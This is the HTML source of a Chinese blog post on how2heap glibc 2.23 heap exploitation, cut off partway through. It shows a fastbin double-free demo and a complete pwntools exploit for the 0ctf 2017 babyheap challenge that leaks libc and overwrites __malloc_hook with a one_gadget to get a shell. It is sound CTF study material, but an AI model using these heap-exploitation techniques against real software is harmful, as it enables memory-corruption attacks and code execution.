

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/pikapika.jpg">
  <link rel="icon" href="/img/pikapika.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Pursue">
  <meta name="keywords" content="Pwner">
  
    <meta name="description" content="通过how2heap的实验，深入了解堆机制">
<meta property="og:type" content="article">
<meta property="og:title" content="学习how2heap的glibc2.23系列">
<meta property="og:url" content="http://example.com/2022/07/08/Pwn/glibc-2.23/index.html">
<meta property="og:site_name" content="Pursue">
<meta property="og:description" content="通过how2heap的实验，深入了解堆机制">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/photo/space.jpg">
<meta property="article:published_time" content="2022-07-07T16:00:00.000Z">
<meta property="article:modified_time" content="2022-07-18T02:39:44.033Z">
<meta property="article:author" content="Pursue">
<meta property="article:tag" content="how2heap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/photo/space.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>学习how2heap的glibc2.23系列 - Pursue</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Pursue</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/photo/space.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="学习how2heap的glibc2.23系列"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-07-08 00:00" pubdate>
          2022年7月8日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          95k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          791 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">学习how2heap的glibc2.23系列</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><h3 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br>	<span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	<span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	<span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(a);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br>	<span class="hljs-comment">// free(a);</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">free</span>(b);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">free</span>(a);		<span class="hljs-comment">// 二次释放堆块a</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br><br>	a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><span class="hljs-comment">// 形成了堆块a和堆块b的循环链表</span><br><br><br>	assert(a == c);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup<br>This file demonstrates a simple <span class="hljs-type">double</span>-<span class="hljs-built_in">free</span> attack with fastbins.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x14b5010 again, things will crash because 0x14b5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x14b5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x14b5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x14b5010, 0x14b5030, 0x14b5010 ]. If we <span class="hljs-built_in">malloc</span> 3 times, we&#x27;ll get 0x14b5010 twice!<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br></code></pre></td></tr></table></figure>



<h4 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h4><p>攻击流程：</p>
<ol>
<li>分配5个堆块（其中堆块4的请求大小要大于等于0x80，用来泄露libc的基地址），释放堆块1和堆块2，此时堆块1指向堆块2，需要注意的是，在malloc的时候会检查堆块是否在<code>fastbin</code>中，因此需要我们分配2个堆块，修改使得第2个堆块为<code>fake_chunk</code>。</li>
<li>通过堆溢出，修改堆块2<code>fd</code>指针的低位指向堆块4，此时将堆块4接在了堆块2的后面，这时候我们再分配的0x10的堆块，就会在堆块4的地方分配，造成堆块重叠。<strong>需要注意的是，我们需要通过堆溢出将堆块4的<code>size</code>位改为0x21，否则无法绕过检查，在malloc的时候会检查分配的堆块大小与<code>size</code>是否符合</strong>。</li>
<li>通过堆溢出修改堆块4的<code>size</code>为0x91，释放堆块4，将其链入<code>unsortedbin</code>，泄露libc的地址，<strong>需要注意的是，我们需要在堆块4之后再分配一个堆块，防止其释放的时候与<code>top chunk</code>合并</strong>。</li>
<li>分配0x60的堆块，利用错位偏移的技巧将堆块分配在<code>__malloc_hook()</code>函数附近，修改钩子。</li>
</ol>
<p><code>main_arena</code>和<code>__malloc_hook</code>的位置如下所示：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0</span>x7f6a86e67b20 - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">0x7f6a86e67b00</span> &lt;__memalign_hook&gt;:	<span class="hljs-number">0</span>x00007f6a86b28ea0	<span class="hljs-number">0</span>x00007f6a86b28a70<br><span class="hljs-attribute">0x7f6a86e67b10</span> &lt;__malloc_hook&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0</span>x6a86b28ea0000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0</span>x0000000000000000	<span class="hljs-number">0</span>x00005614ee1f61a0<br><span class="hljs-attribute">0x7f6a86e67b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0</span>x00005614ee1f60f0	<span class="hljs-number">0</span>x00005614ee1f60f0<br><span class="hljs-attribute">0x7f6a86e67b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0</span>x00005614ee1f60f0	<span class="hljs-number">0</span>x00007f6a86e67b88<br><span class="hljs-attribute">0x7f6a86e67ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0</span>x00007f6a86e67b88	<span class="hljs-number">0</span>x00007f6a86e67b98<br><span class="hljs-attribute">0x7f6a86e67bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0</span>x00007f6a86e67b98	<span class="hljs-number">0</span>x00007f6a86e67ba8<br><span class="hljs-attribute">0x7f6a86e67bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0</span>x00007f6a86e67ba8	<span class="hljs-number">0</span>x00007f6a86e67bb8<br><span class="hljs-attribute">0x7f6a86e67bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0</span>x00007f6a86e67bb8	<span class="hljs-number">0</span>x00007f6a86e67bc8<br><span class="hljs-attribute">0x7f6a86e67be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0</span>x00007f6a86e67bc8	<span class="hljs-number">0</span>x00007f6a86e67bd8<br></code></pre></td></tr></table></figure>



<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./0ctf_2017_babyheap&quot;</span>)<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,25261)</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allo</span>(<span class="hljs-params">size</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>	p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>allo(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 The original position of 2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 4 Simultaneous pointing</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x80</span>)<br><br>free(<span class="hljs-number">4</span>)<br><br>dump(<span class="hljs-number">2</span>)<br>content = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(content))<br>libc_base = (content) - <span class="hljs-number">0x3c4b78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>allo(<span class="hljs-number">0x60</span>)<br><br>free(<span class="hljs-number">4</span>)<br>payload = p64(libc_base + <span class="hljs-number">0x3C4AED</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x60</span>)<br>allo(<span class="hljs-number">0x60</span>)<br>gdb.attach(p)<br>pause()<br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">0x2</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">1</span>)<br>payload += p64(libc_base+<span class="hljs-number">0x4526a</span>)<br><br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">79</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>	<span class="hljs-comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span><br><br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a powerful 